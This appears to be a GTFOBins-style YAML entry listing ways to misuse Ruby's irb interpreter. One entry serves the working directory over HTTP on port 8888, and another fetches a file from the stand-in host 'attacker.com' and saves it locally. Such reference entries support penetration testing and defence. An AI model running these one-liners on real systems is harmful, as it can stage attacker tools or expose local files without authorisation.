---
functions:
  server:
    - description: Serve files in the local folder running an HTTP server on port 8888.
      code: |
        irb
        require 'webrick'; WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start;
  file-download:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        export URL=http://attacker.com/file_to_get
        export LFILE=file_to_save
        irb
        require 'open-uri'; download = open(ENV['URL']); IO.copy_stream(download, ENV['LFILE'])
---
